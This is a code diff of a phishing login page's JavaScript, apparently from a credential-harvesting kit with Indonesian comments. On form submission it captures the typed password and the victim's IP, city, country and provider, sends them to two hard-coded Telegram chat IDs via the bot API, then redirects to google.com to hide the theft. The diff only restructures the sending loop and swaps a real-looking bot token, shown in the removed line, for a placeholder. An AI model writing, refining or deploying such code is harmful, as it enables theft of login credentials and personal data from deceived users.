@@ -5,8 +5,9 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     let password = document.getElementById("password").value;
     let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 
-    let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az 7021";
-    let chatIds = ["7894929132", "6786210993"]; 
+    let botToken = "TOKEN_BOT_TELEGRAM";
+    let chatIds = ["7894929132", "6786210993"]; // Masukkan 2 chat ID
+
     let profileImageUrl = "https://staticg.sportskeeda.com/editor/2022/01/f49b9-16421055515852-1920.jpg";
 
     let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
@@ -44,19 +45,11 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
                 + `🏢 *Provider:* ${ipInfo.org}\n`
                 + `${lokasiUser}`;
 
-    async function sendToAllChats(urlTemplate) {
-        return Promise.all(chatIds.map(chatId => fetch(urlTemplate(chatId))));
+    for (let chatId of chatIds) {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`);
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
     }
 
-    await sendToAllChats(chatId => 
-        `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(profileImageUrl)}`
-    );
-
-    await sendToAllChats(chatId => 
-        `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`
-    );
-
     console.log("✅ Semua data terkirim ke 2 ID!");
-
     window.location.href = "https://www.google.com";
 });
